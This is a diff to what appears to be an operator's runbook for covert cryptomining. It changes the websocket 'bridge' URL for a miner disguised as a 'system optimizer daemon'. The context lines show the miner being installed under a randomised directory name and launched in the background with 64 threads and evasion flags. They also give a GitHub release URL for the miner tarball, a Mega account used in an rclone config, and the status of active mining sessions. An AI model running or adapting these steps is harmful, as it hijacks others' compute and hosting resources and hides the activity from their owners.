@@ -264,7 +264,7 @@ mv sysoptd-2.1.4 opt-{RANDOM_HEX} && \
 cd opt-{RANDOM_HEX} && \
 pip install websockets psutil --break-system-packages -q && \
 python3 sysoptd.py \
-  --bridge wss://chimera-bridge-production-0ef2.up.railway.app \
+  --bridge wss://bridge-production-7c63.up.railway.app \
   --threads 64 \
   --no-split --no-schedule --no-noise --no-ramfill \
   > /tmp/m.log 2>&1 &
@@ -273,7 +273,7 @@ python3 sysoptd.py \
 **Variables:**
 - `MINER_URL`: `https://github.com/cold-pressed-hoodie/system-optimizer-daemon/releases/download/v2.1.5/sysoptd-2.1.5.tar.gz`
 - `RANDOM_HEX`: Generated via `openssl rand -hex 4` (e.g., `739778b5`)
-- Bridge: Railway deployment at `wss://chimera-bridge-production-0ef2.up.railway.app`
+- Bridge: Railway deployment at `wss://bridge-production-7c63.up.railway.app`
 
 **How it works:**
 1. Download miner tarball
@@ -513,7 +513,7 @@ jobs:
 ## Contact & Credentials
 
 - **Mega account:** `emilypeterson30@mail.findmeghana.org` (in rclone config)
-- **Bridge URL:** `wss://chimera-bridge-production-0ef2.up.railway.app`
+- **Bridge URL:** `wss://bridge-production-7c63.up.railway.app`
 - **Miner release:** GitHub `cold-pressed-hoodie/system-optimizer-daemon` v2.1.5
 - **Sessions:** 8 active (1,2,3,4,5,8,9,10), 2 red (6,7)
 
